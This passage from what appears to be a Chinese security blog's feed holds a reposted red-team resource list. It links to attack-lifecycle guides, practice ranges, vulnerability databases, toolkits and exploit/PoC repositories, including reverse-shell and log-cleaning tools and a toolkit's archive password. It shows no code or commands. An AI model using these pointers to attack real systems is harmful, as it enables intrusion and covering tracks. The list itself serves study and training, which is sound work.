href="https://github.com/danielmiessler/SecLists">SecLists</a> – 收集安全评估期间使用的多种类型的列表。</p></li><li><p><a href="https://github.com/PaulSec/awesome-sec-talks">安全会谈</a> – 安全会议的策划列表。</p></li><li><p><a href="https://github.com/jivoi/awesome-osint">OSINT</a> – 包含大量资源的令人敬畏的OSINT列表。</p></li><li><p><a href="https://github.com/InQuest/awesome-yara">YARA</a> – YARA规则，工具和人员。</p></li><li><p><a href="https://github.com/meitar/awesome-cybersecurity-blueteam">蓝队</a> – 为网络安全蓝队提供了令人敬畏的资源，工具和其他闪亮的东西。</p></li><li><p><a href="https://github.com/sundaysec/Android-Exploits">Android漏洞利用</a> – <a href="https://github.com/sundaysec/Android-Exploits">Android漏洞</a>利用和黑客<a href="https://github.com/sundaysec/Android-Exploits">攻击</a>指南。</p></li><li><p>无服务器安全性</p><p> – 精选无服务器安全资源的精选列表，例如（e）书籍，文章，白皮书，博客和研究论文。</p><p>原始URL:<br><a href="https://github.com/premepen/pen-tools/blob/master/awesome-pentest-cn.md#penetration-testing-resources">https://github.com/premepen/pen-tools/blob/master/awesome-pentest-cn.md#penetration-testing-resources</a></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>资料收集</category>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>资料收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【转载】红队技战法</title>
    <link href="/2021/03/09/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91%E7%BA%A2%E9%98%9F%E6%8A%80%E6%88%98%E6%B3%95/"/>
    <url>/2021/03/09/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91%E7%BA%A2%E9%98%9F%E6%8A%80%E6%88%98%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>转载于：<a href="https://www.lshack.cn/772/">https://www.lshack.cn/772/</a></p><h1 id="项目简介"><a href="#项目简介" class="headerlink" title="项目简介#"></a><strong>项目简介</strong>#</h1><p>一个 Red Team 攻击的生命周期，整个生命周期包括：<br>信息收集、攻击尝试获得权限、持久性控制、权限提升、网络信息收集、横向移动、数据分析（在这个基础上再做持久化控制）、在所有攻击结束之后清理并退出战场。</p><h2 id="相关资源列表"><a href="#相关资源列表" class="headerlink" title="相关资源列表#"></a><strong>相关资源列表</strong>#</h2><ul><li><p><a href="https://mitre-attack.github.io/">https://mitre-attack.github.io/</a> mitre 科技机构对攻击技术的总结 wiki</p></li><li><p><a href="https://huntingday.github.io/">https://huntingday.github.io</a> MITRE | ATT&amp;CK 中文站</p></li><li><p><a href="https://arxiv.org/">https://arxiv.org</a> 康奈尔大学（Cornell University）开放文档</p></li><li><p><a href="http://www.owasp.org.cn/owasp-project/owasp-things">http://www.owasp.org.cn/owasp-project/owasp-things</a> OWASP 项目</p></li><li><p><a href="http://www.irongeek.com/i.php?page=security/hackingillustrated">http://www.irongeek.com/i.php?page=security/hackingillustrated</a> 国内外安全大会相关视频与文档</p></li><li><p><a href="https://github.com/knownsec/KCon">https://github.com/knownsec/KCon</a> KCon 大会文章 PPT</p></li><li><p><a href="https://github.com/SecWiki/sec-chart">https://github.com/SecWiki/sec-chart</a> 各种相关安全思维导图集合</p></li><li><p><a href="https://github.com/knownsec/RD_Checklist">https://github.com/knownsec/RD_Checklist</a> 知道创宇技能列表</p></li><li><p><a href="https://github.com/ChrisLinn/greyhame-2017">https://github.com/ChrisLinn/greyhame-2017</a> 灰袍技能书 2017 版本</p></li><li><p><a href="https://github.com/Hack-with-Github/Awesome-Hacking">https://github.com/Hack-with-Github/Awesome-Hacking</a> GitHub 万星推荐：黑客成长技术清单</p></li><li><p><a href="https://github.com/k4m4/movies-for-hackers">https://github.com/k4m4/movies-for-hackers</a> 安全相关电影</p></li><li><p><a href="https://github.com/jaredthecoder/awesome-vehicle-security">https://github.com/jaredthecoder/awesome-vehicle-security</a> 一个用于了解车辆安全和汽车黑客的资源清单</p></li><li><p><a href="https://www.jianshu.com/p/852e0fbe2f4c">https://www.jianshu.com/p/852e0fbe2f4c</a> 安全产品厂商分类</p></li><li><p><a href="https://www.reddit.com/r/Python/comments/a81mg3/the_entire_mit_intro_computer_science_class_using/">https://www.reddit.com/r/Python/comments/a81mg3/the_entire_mit_intro_computer_science_class_using/</a> 麻省理工机器学习视频</p></li><li><p><a href="https://github.com/fxsjy/jieba">https://github.com/fxsjy/jieba</a> py，结巴中文分词</p></li><li><p><a href="https://github.com/thunlp/THULAC-Python">https://github.com/thunlp/THULAC-Python</a> py，清华中文分词</p></li><li><p><a href="https://github.com/lancopku/PKUSeg-python">https://github.com/lancopku/PKUSeg-python</a> py3，北大中文分词</p></li><li><p><a href="https://github.com/fengdu78/Coursera-ML-AndrewNg-Notes">https://github.com/fengdu78/Coursera-ML-AndrewNg-Notes</a> 吴恩达机器学习 python 笔记</p></li><li><p><a href="https://paperswithcode.com/sota">https://paperswithcode.com/sota</a> 机器学习具体项目、演示、代码</p></li><li><p><a href="https://github.com/duoergun0729/nlp">https://github.com/duoergun0729/nlp</a> 一本开源的 NLP（神经语言程序学）入门书籍</p></li><li><p><a href="https://www.freebuf.com/articles/web/195304.html">https://www.freebuf.com/articles/web/195304.html</a> 一句话木马的套路</p></li></ul><h2 id="攻防测试手册"><a href="#攻防测试手册" class="headerlink" title="攻防测试手册#"></a><strong>攻防测试手册</strong>#</h2><ul><li><p><a href="https://micropoor.blogspot.com/2019/01/php8.html">https://micropoor.blogspot.com/2019/01/php8.html</a> PHP 安全新闻早 8 点课程系列高持续渗透–Microporor</p></li><li><p><a href="https://github.com/Micropoor/Micro8">https://github.com/Micropoor/Micro8</a> Microporor 高级攻防 100 课</p></li><li><p><a href="https://github.com/maskhed/Papers">https://github.com/maskhed/Papers</a> 包含 100 课等经典攻防教材、安全知识</p></li><li><p><a href="https://github.com/infosecn1nja/AD-Attack-Defense">https://github.com/infosecn1nja/AD-Attack-Defense</a> 红蓝方攻防手册</p></li><li><p><a href="https://github.com/yeyintminthuhtut/Awesome-Red-Teaming">https://github.com/yeyintminthuhtut/Awesome-Red-Teaming</a> 优秀红队资源列表</p></li><li><p><a href="https://github.com/foobarto/redteam-notebook">https://github.com/foobarto/redteam-notebook</a> 红队标准渗透测试流程+常用命令</p></li><li><p><a href="https://github.com/tom0li/collection-document">https://github.com/tom0li/collection-document</a> 文章收集：安全部、SDL、src、渗透测试、漏洞利用</p></li><li><p><a href="https://github.com/kbandla/APTnotes">https://github.com/kbandla/APTnotes</a> 各种公开的文件和相关的 APT 笔记，还有软件样本</p></li><li><p><a href="https://wizardforcel.gitbooks.io/web-hacking-101/content">https://wizardforcel.gitbooks.io/web-hacking-101/content</a> Web Hacking 101 中文版</p></li><li><p><a href="https://techvomit.net/web-application-penetration-testing-notes/">https://techvomit.net/web-application-penetration-testing-notes/</a> web 渗透测试笔记</p></li><li><p><a href="https://github.com/qazbnm456/awesome-web-security">https://github.com/qazbnm456/awesome-web-security</a> Web 安全资料和资源列表</p></li><li><p><a href="http://pentestmonkey.net/category/cheat-sheet">http://pentestmonkey.net/category/cheat-sheet</a> 渗透测试常见条目</p></li><li><p><a href="https://github.com/demonsec666/Security-Toolkit">https://github.com/demonsec666/Security-Toolkit</a> 渗透攻击链中常用工具及使用场景</p></li><li><p><a href="https://github.com/Kinimiwar/Penetration-Testing">https://github.com/Kinimiwar/Penetration-Testing</a> 渗透测试方向优秀资源收集</p></li><li><p><a href="https://github.com/jshaw87/Cheatsheets">https://github.com/jshaw87/Cheatsheets</a> 渗透测试/安全秘籍/笔记</p></li></ul><h2 id="内网安全文档"><a href="#内网安全文档" class="headerlink" title="内网安全文档#"></a><strong>内网安全文档</strong>#</h2><ul><li><p><a href="https://attack.mitre.org/wiki/Lateral_Movement">https://attack.mitre.org/wiki/Lateral_Movement</a> mitre 机构对横向移动的总结</p></li><li><p><a href="https://payloads.online/archivers/2018-11-30/1">https://payloads.online/archivers/2018-11-30/1</a> 彻底理解 Windows 认证 - 议题解读</p></li><li><p><a href="https://github.com/klionsec/klionsec.github.io">https://github.com/klionsec/klionsec.github.io</a> 内网大牛的学习历程</p></li><li><p><a href="https://github.com/l3m0n/pentest_study">https://github.com/l3m0n/pentest_study</a> 从零开始内网渗透学习</p></li><li><p><a href="https://github.com/Ridter/Intranet_Penetration_Tips">https://github.com/Ridter/Intranet_Penetration_Tips</a> 内网渗透 TIPS</p></li></ul><h2 id="学习手册相关资源"><a href="#学习手册相关资源" class="headerlink" title="学习手册相关资源#"></a><strong>学习手册相关资源</strong>#</h2><ul><li><p><a href="https://github.com/HarmJ0y/CheatSheets">https://github.com/HarmJ0y/CheatSheets</a> 多个项目的速查手册（Beacon / Cobalt Strike，PowerView，PowerUp，Empire 和 PowerSploit）</p></li><li><p><a href="https://wizardforcel.gitbooks.io/kali-linux-web-pentest-cookbook/content/">https://wizardforcel.gitbooks.io/kali-linux-web-pentest-cookbook/content/</a> Kali Linux Web 渗透测试秘籍 中文版</p></li><li><p><a href="https://github.com/louchaooo/kali-tools-zh">https://github.com/louchaooo/kali-tools-zh</a> kali 下工具使用介绍手册</p></li><li><p><a href="https://www.offensive-security.com/metasploit-unleashed/">https://www.offensive-security.com/metasploit-unleashed/</a> kali 出的 metasploit 指导笔记</p></li><li><p><a href="http://www.hackingarticles.in/comprehensive-guide-on-hydra-a-brute-forcing-tool/">http://www.hackingarticles.in/comprehensive-guide-on-hydra-a-brute-forcing-tool/</a> hydra 使用手册</p></li><li><p><a href="https://www.gitbook.com/book/t0data/burpsuite/details">https://www.gitbook.com/book/t0data/burpsuite/details</a> burpsuite 实战指南</p></li><li><p><a href="https://zhuanlan.zhihu.com/p/26618074">https://zhuanlan.zhihu.com/p/26618074</a> Nmap 扩展脚本使用方法</p></li><li><p><a href="https://somdev.me/21-things-xss/">https://somdev.me/21-things-xss/</a> XSS 的 21 个扩展用途</p></li><li><p><a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/">https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/</a> sql 注入 sheet 表</p></li><li><p><a href="https://sqlwiki.netspi.com/">https://sqlwiki.netspi.com/</a> 你要的 sql 注入知识点都能找到</p></li><li><p><a href="https://github.com/kevins1022/SQLInjectionWiki">https://github.com/kevins1022/SQLInjectionWiki</a> 一个专注于聚合和记录各种 SQL 注入方法的 wiki</p></li><li><p><a href="https://github.com/hardenedlinux/linux-exploit-development-tutorial">https://github.com/hardenedlinux/linux-exploit-development-tutorial</a> Linux exploit 开发入门</p></li><li><p><a href="https://wizardforcel.gitbooks.io/asani/content">https://wizardforcel.gitbooks.io/asani/content</a> 浅入浅出 Android 安全 中文版</p></li><li><p><a href="https://wizardforcel.gitbooks.io/lpad/content">https://wizardforcel.gitbooks.io/lpad/content</a> Android 渗透测试学习手册 中文版</p></li><li><p><a href="https://github.com/writeups/ios">https://github.com/writeups/ios</a> ios 漏洞 writeup 笔记</p></li><li><p><a href="http://blog.safebuff.com/2016/07/03/SSRF-Tips/">http://blog.safebuff.com/2016/07/03/SSRF-Tips/</a> ssrf 漏洞利用手册</p></li></ul><h2 id="Checklist-和基础安全知识"><a href="#Checklist-和基础安全知识" class="headerlink" title="Checklist 和基础安全知识#"></a><strong>Checklist 和基础安全知识</strong>#</h2><ul><li><p><a href="https://book.yunzhan365.com/umta/rtnp/mobile/index.html">https://book.yunzhan365.com/umta/rtnp/mobile/index.html</a> 网络安全科普小册子</p></li><li><p><a href="http://sec.cuc.edu.cn/huangwei/textbook/ns/">http://sec.cuc.edu.cn/huangwei/textbook/ns/</a> 网络安全电子版教材。中传信安课程网站</p></li><li><p><a href="https://mitre.github.io/attack-navigator/enterprise/">https://mitre.github.io/attack-navigator/enterprise/</a> mitre 机构 att&amp;ck 入侵检测条目</p></li><li><p><a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a> 表类型包括用户名，密码，URL，敏感数据模式，模糊测试负载，Web shell 等</p></li><li><p><a href="https://github.com/GitGuardian/APISecurityBestPractices">https://github.com/GitGuardian/APISecurityBestPractices</a> api 接口测试 checklist</p></li><li><p><a href="https://github.com/ym2011/SecurityManagement">https://github.com/ym2011/SecurityManagement</a> 分享在建设安全管理体系、ISO27001、等级保护、安全评审过程中的点点滴滴</p></li><li><p><a href="https://mp.weixin.qq.com/s?__biz=MzAxNDY2MTQ2OQ==&mid=2650943453&idx=1&sn=e3dc98585ae9e7e39aeafc029dca4c7a&scene=21#wechat_redirect">https://mp.weixin.qq.com/s/O36e0gl4cs0ErQPsb5L68Q</a> 区块链，以太坊智能合约审计 CheckList</p></li><li><p><a href="https://github.com/slowmist/eos-bp-nodes-security-checklist">https://github.com/slowmist/eos-bp-nodes-security-checklist</a> 区块链，EOS bp nodes security checklist（EOS 超级节点安全执行指南）</p></li><li><p><a href="https://xz.aliyun.com/t/2089">https://xz.aliyun.com/t/2089</a> 金融科技 SDL 安全设计 checklist</p></li><li><p><a href="https://github.com/juliocesarfort/public-pentesting-reports">https://github.com/juliocesarfort/public-pentesting-reports</a> 由几家咨询公司和学术安全组织发布的公共渗透测试报告的列表。</p></li><li><p><a href="http://www.freebuf.com/articles/network/169632.html">http://www.freebuf.com/articles/network/169632.html</a> 开源软件创建 SOC 的一份清单</p></li><li><p><a href="https://github.com/0xRadi/OWASP-Web-Checklist">https://github.com/0xRadi/OWASP-Web-Checklist</a> owasp 网站检查条目</p></li><li><p><a href="https://www.securitypaper.org/">https://www.securitypaper.org/</a> SDL 开发安全生命周期管理</p></li><li><p><a href="https://github.com/Jsitech/JShielder">https://github.com/Jsitech/JShielder</a> linux 下服务器一键加固脚本</p></li><li><p><a href="https://github.com/wstart/DB_BaseLine">https://github.com/wstart/DB_BaseLine</a> 数据库基线检查工具</p></li></ul><h2 id="产品设计文档"><a href="#产品设计文档" class="headerlink" title="产品设计文档#"></a><strong>产品设计文档</strong>#</h2><ul><li><p><a href="https://www.freebuf.com/sectool/135032.html">https://www.freebuf.com/sectool/135032.html</a> 构建一个高交互型的难以发现的蜜罐</p></li><li><p><a href="https://bloodzer0.github.io/ossa/">https://bloodzer0.github.io/ossa/</a> 利用开源文件进行开源安全架构.主机、扫描器、端口、日志、防护设备等</p></li><li><p><a href="https://github.com/dvf/blockchain">https://github.com/dvf/blockchain</a> 用 Python 从零开始创建区块链</p></li><li><p><a href="https://github.com/crazywa1ker/DarthSidious-Chinese">https://github.com/crazywa1ker/DarthSidious-Chinese</a> 从 0 开始你的域渗透之旅，DarthSidious 中文版</p></li><li><p><a href="https://paper.seebug.org/772/">https://paper.seebug.org/772/</a> 如何使用 KittyFuzzer 结合 ISF 中的工控协议组件对工控协议进行 Fuzz</p></li></ul><h2 id="学习靶场"><a href="#学习靶场" class="headerlink" title="学习靶场#"></a><strong>学习靶场</strong>#</h2><ul><li><p><a href="https://www.blackmoreops.com/2018/11/06/124-legal-hacking-websites-to-practice-and-learn/">https://www.blackmoreops.com/2018/11/06/124-legal-hacking-websites-to-practice-and-learn/</a> 124 个合法的可以练习 Hacking 技术的网站</p></li><li><p><a href="https://www.zhihu.com/question/267204109">https://www.zhihu.com/question/267204109</a> 学 web 安全去哪里找各种各样的靶场？</p></li><li><p><a href="https://www.vulnhub.com/">https://www.vulnhub.com</a> 许多 ctf 靶机汇总</p></li><li><p><a href="https://www.wechall.net/">https://www.wechall.net</a> 世界知名 ctf 汇总交流网站</p></li><li><p><a href="https://www.xssgame.com/">https://www.xssgame.com</a> 谷歌 XSS 挑战</p></li><li><p><a href="http://xss.tv/">http://xss.tv</a> 在线靶场挑战</p></li><li><p><a href="https://www.hackthebox.eu/">https://www.hackthebox.eu</a> 在线靶场挑战</p></li><li><p><a href="https://www.root-me.org/">https://www.root-me.org</a> 在线靶场挑战</p></li><li><p><a href="http://www.itsecgames.com/">http://www.itsecgames.com</a> bWAPP，包含 100 多种漏洞环境</p></li><li><p><a href="https://github.com/c0ny1/vulstudy">https://github.com/c0ny1/vulstudy</a> 多种漏洞复现系统的 docker 汇总</p></li><li><p><a href="https://github.com/bkimminich/juice-shop">https://github.com/bkimminich/juice-shop</a> 常见 web 安全实验靶场市场</p></li><li><p><a href="https://github.com/ethicalhack3r/DVWA">https://github.com/ethicalhack3r/DVWA</a> web 安全实验靶场</p></li><li><p><a href="https://www.freebuf.com/articles/web/123779.html">https://www.freebuf.com/articles/web/123779.html</a> 新手指南：DVWA-1.9 全级别教程</p></li><li><p><a href="https://github.com/78778443/permeate">https://github.com/78778443/permeate</a> php，常见漏洞靶场</p></li><li><p><a href="https://github.com/gh0stkey/DoraBox">https://github.com/gh0stkey/DoraBox</a> php,常见漏洞靶场</p></li><li><p><a href="https://github.com/stamparm/DSVW">https://github.com/stamparm/DSVW</a> py2,常见漏洞靶场</p></li><li><p><a href="https://github.com/amolnaik4/bodhi">https://github.com/amolnaik4/bodhi</a> py,常见漏洞靶场</p></li><li><p><a href="https://github.com/Safflower/Solve-Me">https://github.com/Safflower/Solve-Me</a> php，韩国一个偏代码审计的 ctf 靶场源码</p></li><li><p><a href="https://github.com/WebGoat/WebGoat">https://github.com/WebGoat/WebGoat</a> 一键 jar 包，web 安全实验靶场</p></li><li><p><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a> 基于 SQLite 的 sql 注入学习靶场</p></li><li><p><a href="https://github.com/lcamry/sqli-labs">https://github.com/lcamry/sqli-labs</a> 通过 sqli-labs 演示 mysql 相关的注入手法</p></li><li><p><a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a> 一个帮你总结所有类型的上传漏洞的靶场</p></li><li><p><a href="https://github.com/LandGrey/upload-labs-writeup">https://github.com/LandGrey/upload-labs-writeup</a> upload-labs 指导手册</p></li><li><p><a href="https://github.com/Go0s/LFIboomCTF">https://github.com/Go0s/LFIboomCTF</a> 本地文件包含漏洞&amp;&amp;PHP 利用协议&amp;&amp;实践源码</p></li><li><p><a href="https://in.security/lin-security-practise-your-linux-privilege-escalation-foo/">https://in.security/lin-security-practise-your-linux-privilege-escalation-foo/</a> 一个虚拟机文件用于 linux 提权练习</p></li><li><p><a href="https://github.com/OWASP/igoat">https://github.com/OWASP/igoat</a> 适用于 ios 应用程序测试和安全性的学习工具</p></li><li><p><a href="https://github.com/prateek147/DVIA-v2">https://github.com/prateek147/DVIA-v2</a> 适用于 ios 应用程序测试和安全性的学习工具</p></li><li><p><a href="https://github.com/rapid7/metasploitable3">https://github.com/rapid7/metasploitable3</a> metasploit 练习系统</p></li><li><p><a href="https://github.com/rapid7/metasploit-vulnerability-emulator">https://github.com/rapid7/metasploit-vulnerability-emulator</a> 基于 perl 的 metasploit 模拟环境，练习操作</p></li><li><p><a href="https://github.com/chryzsh/DarthSidious">https://github.com/chryzsh/DarthSidious</a> AD 域环境的搭建、渗透、防护</p></li><li><p><a href="https://github.com/c0ny1/xxe-lab">https://github.com/c0ny1/xxe-lab</a> 一个包含 php,java,python,C#等各种语言版本的 XXE 漏洞 Demo</p></li></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现#"></a><strong>漏洞复现</strong>#</h2><ul><li><p><a href="https://github.com/vulhub/vulhub">https://github.com/vulhub/vulhub</a> Vulhub 是一个面向大众的开源漏洞靶场，无需 docker 知识，执行两条命令即可编译、运行一个完整的漏洞靶场镜像</p></li><li><p><a href="https://github.com/Medicean/VulApps">https://github.com/Medicean/VulApps</a> 收集各种漏洞环境，为方便使用，统一采用 Dockerfile 形式。同时也收集了安全工具环境。</p></li><li><p><a href="https://github.com/bingohuang/docker-labs">https://github.com/bingohuang/docker-labs</a> 制作在线 docker 平台</p></li></ul><h2 id="开源漏洞库"><a href="#开源漏洞库" class="headerlink" title="开源漏洞库#"></a><strong>开源漏洞库</strong>#</h2><ul><li><p><a href="https://wooyun.kieran.top/#!/">https://wooyun.kieran.top/#!/</a> 2016 年之前，乌云 Drops 文章，公开漏洞详情文章</p></li><li><p><a href="https://wooyun.js.org/">https://wooyun.js.org/</a> 2016 年之前，乌云 Drops 文章，公开漏洞详情文章</p></li><li><p><a href="https://dvpnet.io/list/index/state/3">https://dvpnet.io/list/index/state/3</a> 公开漏洞详情文章</p></li><li><p><a href="https://sec.ly.com/bugs">https://sec.ly.com/bugs</a> 同程安全公开漏洞详情文章</p></li><li><p><a href="http://ics.cnvd.org.cn/">http://ics.cnvd.org.cn</a> 中国国家工控漏洞库</p></li><li><p><a href="https://ics-cert.us-cert.gov/advisories">https://ics-cert.us-cert.gov/advisories</a> 美国国家工控漏洞库</p></li><li><p><a href="http://www.nsfocus.net/index.php?act=sec_bug">http://www.nsfocus.net/index.php?act=sec_bug</a> 绿盟漏洞库，含工控</p></li><li><p><a href="http://ivd.winicssec.com/">http://ivd.winicssec.com/</a> 威努特工控漏洞库</p></li><li><p><a href="http://cve.scap.org.cn/view/ics">http://cve.scap.org.cn/view/ics</a> CVE 中文工控漏洞库</p></li><li><p><a href="https://cve.mitre.org/cve/search_cve_list.html">https://cve.mitre.org/cve/search_cve_list.html</a> 美国 MITRE 公司负责维护的 CVE 漏洞库</p></li><li><p><a href="https://www.exploit-db.com/">https://www.exploit-db.com</a> 美国 Offensive Security 的漏洞库</p></li><li><p><a href="https://nvd.nist.gov/vuln/search">https://nvd.nist.gov/vuln/search</a> 美国国家信息安全漏洞库</p></li></ul><h2 id="工具包集合"><a href="#工具包集合" class="headerlink" title="工具包集合#"></a><strong>工具包集合</strong>#</h2><ul><li><p><a href="http://www.4hou.com/web/11241.html">http://www.4hou.com/web/11241.html</a> 史上最全攻击模拟工具盘点</p></li><li><p><a href="https://github.com/infosecn1nja/Red-Teaming-Toolkit">https://github.com/infosecn1nja/Red-Teaming-Toolkit</a> 信息收集、攻击尝试获得权限、持久性控制、权限提升、网络信息收集、横向移动、数据分析（在这个基础上再做持久化控制）、清理痕迹</p></li><li><p><a href="https://github.com/toolswatch/blackhat-arsenal-tools">https://github.com/toolswatch/blackhat-arsenal-tools</a> 黑帽大会工具集</p></li><li><p><a href="https://www.cnblogs.com/k8gege">https://www.cnblogs.com/k8gege</a> K8 哥哥工具包集合。解压密码 Kk8team,Kk8gege</p></li><li><p><a href="https://github.com/n00py/ReadingList/blob/master/gunsafe.txt">https://github.com/n00py/ReadingList/blob/master/gunsafe.txt</a> 安全工具集</p></li><li><p><a href="https://github.com/Ridter/Pentest">https://github.com/Ridter/Pentest</a> 安全工具集</p></li><li><p><a href="https://github.com/redcanaryco/atomic-red-team">https://github.com/redcanaryco/atomic-red-team</a> win、linux、mac 等多方面 apt 利用手段、技术与工具集</p></li><li><p><a href="https://github.com/Cooolis/Cooolis.github.io">https://github.com/Cooolis/Cooolis.github.io</a> Cooolis 是一个操作系统命令技巧备忘录，<a href="https://cooolis.payloads.online/">https://cooolis.payloads.online</a></p></li><li><p><a href="https://github.com/LOLBAS-Project/LOLBAS">https://github.com/LOLBAS-Project/LOLBAS</a> 常见的渗透测试利用的脚本与二进制文件集合</p></li><li><p><a href="https://www.owasp.org/index.php/File:CSRFTester-1.0.zip">https://www.owasp.org/index.php/File:CSRFTester-1.0.zip</a> csrf 验证工具</p></li><li><p><a href="https://github.com/ufrisk/MemProcFS">https://github.com/ufrisk/MemProcFS</a> 以访问文件系统的方式访问物理内存, 可读写, 有易于使用的接口. 当前支持 Windows</p></li><li><p><a href="https://github.com/vletoux/SpoolerScanner">https://github.com/vletoux/SpoolerScanner</a> 检测 Windows 远程打印机服务是否开启的工具</p></li><li><p><a href="https://github.com/sirpsycho/firecall">https://github.com/sirpsycho/firecall</a> 直接向 CiscoASA 防火墙发送命令, 无需登录防火墙后再做修改</p></li><li><p><a href="https://github.com/jboss-javassist/javassist">https://github.com/jboss-javassist/javassist</a> 能够操作字节码框架，通过它我们能很轻易的修改 class 代码文件</p></li><li><p><a href="https://github.com/ConsenSys/mythril-classic">https://github.com/ConsenSys/mythril-classic</a> 用于以太坊智能协议的安全分析工具</p></li><li><p><a href="https://github.com/a13xp0p0v/kconfig-hardened-check">https://github.com/a13xp0p0v/kconfig-hardened-check</a> 用于检查 Linux 内核配置中的安全加固选项的脚本</p></li><li><p><a href="https://github.com/lionsoul2014/ip2region">https://github.com/lionsoul2014/ip2region</a> ip 地址定位库，支持 python3 等多接口。类比 geoip</p></li><li><p><a href="https://github.com/m101/hsploit">https://github.com/m101/hsploit</a> 基于 rust 的 HEVD 漏洞利用程序</p></li><li><p><a href="https://github.com/ticarpi/jwt_tool">https://github.com/ticarpi/jwt_tool</a> 针对 json web token 的检测</p></li><li><p><a href="https://github.com/clr2of8/DPAT">https://github.com/clr2of8/DPAT</a> 域密码配置审计</p></li><li><p><a href="https://github.com/chenjj/CORScanner">https://github.com/chenjj/CORScanner</a> 域解析漏洞，跨域扫描器</p></li><li><p><a href="https://github.com/dienuet/crossdomain">https://github.com/dienuet/crossdomain</a> 域解析漏洞，跨域扫描器</p></li><li><p><a href="https://github.com/sfan5/fi6s">https://github.com/sfan5/fi6s</a> ipv6 端口快速扫描器</p></li><li><p><a href="https://github.com/lavalamp-/ipv666">https://github.com/lavalamp-/ipv666</a> go,ipv6 地址枚举扫描</p></li><li><p><a href="https://github.com/commixproject/commix">https://github.com/commixproject/commix</a> 命令注入漏洞扫描</p></li><li><p><a href="https://github.com/Graph-X/davscan">https://github.com/Graph-X/davscan</a> DAVScan 是一款快速轻便的 webdav 扫描仪，旨在发现 DAV 启用的 Web 服务器上的隐藏文件和文件夹</p></li><li><p><a href="https://github.com/jcesarstef/dotdotslash">https://github.com/jcesarstef/dotdotslash</a> 目录遍历漏洞测试</p></li><li><p><a href="https://github.com/P3GLEG/WhaleTail">https://github.com/P3GLEG/WhaleTail</a> 根据 docker 镜像生成成 dockerfile</p></li><li><p><a href="https://github.com/cr0hn/dockerscan">https://github.com/cr0hn/dockerscan</a> docker 扫描工具</p></li><li><p><a href="https://github.com/utiso/dorkbot">https://github.com/utiso/dorkbot</a> 通过定制化的谷歌搜索引擎进行漏洞页面搜寻及扫描</p></li><li><p><a href="https://github.com/NullArray/DorkNet">https://github.com/NullArray/DorkNet</a> 基于搜索引擎的漏洞网页搜寻</p></li><li><p><a href="https://github.com/panda-re/lava">https://github.com/panda-re/lava</a> 大规模向程序中植入恶意程序</p></li><li><p><a href="https://github.com/woj-ciech/Danger-zone">https://github.com/woj-ciech/Danger-zone</a> 关联域名、IP 和电子邮件地址之间的数据并将其可视化输出</p></li><li><p><a href="https://github.com/securemode/DefenderKeys">https://github.com/securemode/DefenderKeys</a> 枚举出被 Windows Defender 排除扫描的配置</p></li><li><p><a href="https://github.com/D4Vinci/PasteJacker">https://github.com/D4Vinci/PasteJacker</a> 剪贴板劫持利用工具</p></li><li><p><a href="https://github.com/JusticeRage/freedomfighting">https://github.com/JusticeRage/freedomfighting</a> 日志清理、文件共享、反向 shell、简单爬虫工具包</p></li><li><p><a href="https://github.com/gh0stkey/PoCBox">https://github.com/gh0stkey/PoCBox</a> 漏洞测试验证辅助平台，SONP 劫持、CORS、Flash 跨域资源读取、Google Hack 语法生成、URL 测试字典生成、JavaScript URL 跳转、302 URL 跳转</p></li><li><p><a href="https://github.com/jakubroztocil/httpie">https://github.com/jakubroztocil/httpie</a> http 调试工具，类似 curl，功能更完善</p></li><li><p><a href="https://www.getpostman.com/">https://www.getpostman.com/</a> http 调试工具，带界面</p></li></ul><h2 id="漏洞收集与-Exp、Poc-利用"><a href="#漏洞收集与-Exp、Poc-利用" class="headerlink" title="漏洞收集与 Exp、Poc 利用#"></a><strong>漏洞收集与 Exp、Poc 利用</strong>#</h2><ul><li><p><a href="https://github.com/Lcys/Python_PoC">https://github.com/Lcys/Python_PoC</a> python3 的 poc、exp 快速编写模板，有众多模范版本</p></li><li><p><a href="https://github.com/raminfp/linux_exploit_development">https://github.com/raminfp/linux_exploit_development</a> linux 漏洞利用开发手册</p></li><li><p><a href="https://github.com/mudongliang/LinuxFlaw">https://github.com/mudongliang/LinuxFlaw</a> 包含 linux 下软件漏洞列表</p></li><li><p><a href="https://github.com/coffeehb/Some-PoC-oR-ExP">https://github.com/coffeehb/Some-PoC-oR-ExP</a> 各种漏洞 poc、Exp 的收集或编写</p></li><li><p><a href="https://github.com/userlandkernel/plataoplomo">https://github.com/userlandkernel/plataoplomo</a> Sem Voigtländer 公开其发现的 iOS 中各种漏洞，包括（Writeup/POC/Exploit）</p></li><li><p><a href="https://github.com/coffeehb/Some-PoC-oR-ExP/blob/master/check_icmp_dos.py">https://github.com/coffeehb/Some-PoC-oR-ExP/blob/master/check_icmp_dos.py</a> CVE-2018-4407，macos/ios 缓冲区溢出可导致系统崩溃</p></li><li><p><a href="https://github.com/vulnersCom/getsploit">https://github.com/vulnersCom/getsploit</a> py2,仿照 searchsploit 通过各种数据库的官方接口进行 payload 的查找</p></li><li><p><a href="https://github.com/SecWiki/CMS-Hunter">https://github.com/SecWiki/CMS-Hunter</a> CMS 漏洞测试用例集合</p></li><li><p><a href="https://github.com/Mr5m1th/0day">https://github.com/Mr5m1th/0day</a> 各种开源 CMS 各种版本的漏洞以及 EXP</p></li><li><p><a href="https://github.com/w1109790800/penetration">https://github.com/w1109790800/penetration</a> CMS 新老版本 exp 与系统漏洞搜集表</p></li><li><p><a href="https://github.com/blacknbunny/libSSH-Authentication-Bypass">https://github.com/blacknbunny/libSSH-Authentication-Bypass</a> CVE-2018-10933，libssh 服务端身份验证绕过</p></li><li><p><a href="https://github.com/leapsecurity/libssh-scanner">https://github.com/leapsecurity/libssh-scanner</a> CVE-2018-10933，libssh 服务端身份验证绕过</p></li><li><p><a href="https://github.com/anbai-inc/CVE-2018-4878">https://github.com/anbai-inc/CVE-2018-4878</a> Adobe Flash Exploit 生成 